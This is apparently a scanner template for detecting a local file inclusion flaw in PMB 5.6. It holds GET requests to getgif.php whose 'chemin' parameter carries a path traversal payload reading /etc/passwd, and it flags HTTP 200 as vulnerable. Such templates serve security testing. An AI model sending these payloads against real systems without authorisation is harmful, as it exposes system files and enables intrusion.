id: pmb-directory-traversal
brief:
    title: PMB 5.6 - Local File Inclusion
    by: geeknik
    level: high
    about: PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter.
    label:
        - lfi
        - packetstorm
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik'
        - '{{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik'
      signs:
        - "on": status
          status:
            - 200
